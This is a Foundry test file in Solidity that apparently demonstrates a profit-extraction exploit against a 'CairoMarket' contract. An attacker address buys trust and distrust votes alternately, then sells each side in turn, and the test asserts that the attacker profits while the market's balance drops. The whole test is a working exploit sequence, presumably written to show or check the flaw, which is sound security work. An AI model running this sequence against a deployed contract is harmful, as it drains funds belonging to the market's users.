// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {CairoMarket} from "../src/CairoMarket.sol";

contract CairoMarketTest is Test {
    CairoMarket public market;
    address public attacker = makeAddr("attacker");

    // Reserve liquidity sitting in the market from prior activity.
    uint256 public constant SEED = 10 ether;

    function setUp() public {
        market = new CairoMarket{value: SEED}();
        vm.deal(attacker, 5 ether);
    }

    function test_DrainCairoMarket() public {
        uint256 attackerStart = attacker.balance;
        uint256 marketStart = address(market).balance;

        assertEq(market.trustVotes(), 1);
        assertEq(market.distrustVotes(), 1);

        vm.startPrank(attacker);

        // --- Buying phase: alternate sides ---
        market.buyTrust{value: 1 ether}(1);
        market.buyDistrust{value: 1 ether}(1);
        market.buyTrust{value: 1 ether}(1);
        market.buyDistrust{value: 1 ether}(1);

        uint256 spent = attackerStart - attacker.balance;
        console2.log("total paid   :", spent);

        // --- Selling phase: sequential, one side fully then the other ---
        market.sellTrust(2);
        market.sellDistrust(2);

        vm.stopPrank();

        uint256 profit = attacker.balance - attackerStart;
        console2.log("total profit :", profit);

        uint256 attackerEnd = attacker.balance;
        uint256 marketEnd = address(market).balance;

        // Attacker walks away with more ETH than they started with...
        assertGt(attackerEnd, attackerStart, "attacker did not profit");
        assertLe(marketEnd, marketStart, "Market did not drained");
        // The market's vote counts are back to genesis: pure value extraction.
        assertEq(market.trustVotes(), 1);
        assertEq(market.distrustVotes(), 1);
    }
}
